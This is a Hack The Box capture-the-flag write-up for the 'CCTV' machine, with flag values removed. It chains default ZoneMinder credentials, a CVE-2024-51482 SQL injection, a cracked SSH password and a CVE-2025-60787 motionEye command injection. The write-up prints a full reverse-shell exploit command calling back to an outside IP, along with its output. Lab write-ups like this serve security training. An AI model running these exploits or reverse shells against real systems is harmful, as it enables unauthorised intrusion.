# CCTV Write-up

> Hack The Box / CTF write-up  
> Flag values have been intentionally removed.

## Enumeration

I started by scanning the target with Nmap:

```bash
nmap -sSVC -A 10.129.244.156
```

The scan showed two open ports:

```text
22/tcp open  ssh   OpenSSH 9.6p1 Ubuntu 3ubuntu13.14
80/tcp open  http  Apache httpd 2.4.58
```

The HTTP service redirected to:

```text
http://cctv.htb/
```

The host appeared to be running Linux.

After adding `cctv.htb` to `/etc/hosts`, I continued web enumeration.

## ZoneMinder

The ZoneMinder interface was available at:

```text
http://10.129.244.156/zm
```

The credentials used in the original write-up were:

```text
Username: admin
Password: admin
```

After logging in, the installed ZoneMinder version was identified as:

```text
1.37.63
```

According to the original write-up, this version was vulnerable to:

```text
CVE-2024-51482 - Blind SQL Injection
```

A public proof of concept for CVE-2024-51482 was used against the application.

The exploit was used to dump the following database table:

```text
zm.Users
```

The dump revealed a user named:

```text
mark
```

A bcrypt password hash associated with the account was recovered and cracked with Hashcat.

The resulting credentials were:

```text
Username: mark
Password: opensesame
```

## SSH Access as mark

Using the recovered credentials, I connected to the target over SSH:

```bash
ssh mark@cctv.htb
```

When prompted for the password:

```text
opensesame
```

This provided shell access as the `mark` user.

The user flag was available at this stage, but its value is intentionally omitted from this public write-up.

## Internal Service Enumeration

While enumerating the host, I checked listening TCP sockets and identified a service bound to port `8765`:

```bash
ss -tlnp | grep 8765
```

The service was only accessible locally:

```text
http://127.0.0.1:8765
```

Opening the service revealed a motionEye instance.

## motionEye

The credentials shown in the original write-up were:

```text
Username: admin
Password: 989c5a8ee87a0e9521ec81a79187d162109282f0
```

After logging in, the motionEye instance was targeted using:

```text
CVE-2025-60787 - motionEye Command Injection
```

The public proof of concept referenced in the original write-up was:

```text
https://github.com/gunzf0x/CVE-2025-60787
```

I moved into the exploit directory and activated its Python virtual environment:

```bash
cd ~/CVE-2025-60787
source venv/bin/activate
```

The reverse-shell exploit was then launched with:

```bash
python3 CVE-2025-60787.py revshell \
  --url 'http://127.0.0.1:8765' \
  --user 'admin' \
  --password '989c5a8ee87a0e9521ec81a79187d162109282f0' \
  -i 10.10.15.88 \
  --port 4444
```

The exploit output shown in the source write-up was:

```text
[*] Attempting to connect to 'http://127.0.0.1:8765' with credentials
    'admin:989c5a8ee87a0e9521ec81a79187d162109282f0'
[*] Valid credentials provided
[*] Obtaining cameras available
[*] Found 1 camera(s)
    1) Name: 'CAM 01' ; ID: 1; root_directory: '/var/lib/motioneye/Camera1'
[*] Using camera by default (first one found) for the exploit
[*] Payload successfully injected. Check your shell...
~Happy Hacking
```

The source write-up shows that the exploitation step led to access sufficient to retrieve the root flag. The actual root flag value is intentionally omitted here.

The source does not include a separate screenshot of the resulting reverse shell, so I have not invented any missing terminal output.

## Attack Path

```text
Nmap
  ↓
cctv.htb
  ↓
ZoneMinder at /zm
  ↓
Default credentials: admin / admin
  ↓
ZoneMinder 1.37.63
  ↓
CVE-2024-51482
  ↓
Blind SQL Injection
  ↓
Dump zm.Users
  ↓
Recover mark password hash
  ↓
Crack bcrypt hash
  ↓
SSH as mark
  ↓
Local service enumeration
  ↓
motionEye on 127.0.0.1:8765
  ↓
motionEye credentials
  ↓
CVE-2025-60787
  ↓
Command injection / reverse-shell payload
  ↓
root access
```

## Notes

- All user and root flag values have been removed.
- Text from the screenshots has been rewritten as searchable, copyable Markdown.
- The ZoneMinder CVE and motionEye CVE names are preserved exactly as stated in the supplied write-up.
- The source does not include the exact CVE-2024-51482 PoC command or the bcrypt hash itself, so those details were not guessed or reconstructed.
- The source also does not show the final reverse-shell transcript after the motionEye exploit, so only the exploit output actually present in the write-up is reproduced.
